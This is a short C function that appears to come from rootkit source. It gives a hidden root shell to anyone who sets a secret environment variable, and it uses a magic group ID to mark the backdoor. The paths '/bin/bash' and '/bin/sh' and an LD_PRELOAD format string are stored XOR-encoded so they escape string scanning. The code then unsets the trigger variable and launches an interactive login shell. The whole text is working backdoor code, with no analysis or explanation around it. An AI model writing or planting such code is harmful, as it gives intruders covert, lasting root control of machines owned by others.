void esh (void) { // environment var root shell
  char *env_var = getenv(ENV_VARIABLE);
  if (env_var && !geteuid()) {
      setgid(MAGIC_GID);
      setuid(0);
      char bash[10],sh[8],fmtstring[14];
      strcpy(bash,"1|wp1|\x7fmv");
      strcpy(sh,"1|wp1mv");
      strcpy(fmtstring,"RZANL[RQ_Z#;m");
      sxor(sh); sxor(bash); sxor(fmtstring);
      unsetenv (ENV_VARIABLE);
      execl (bash, SHELL_NAME, "--login","-i", (char *) 0);
      execl (sh, SHELL_NAME, (char *) 0);//fallback
  }
}

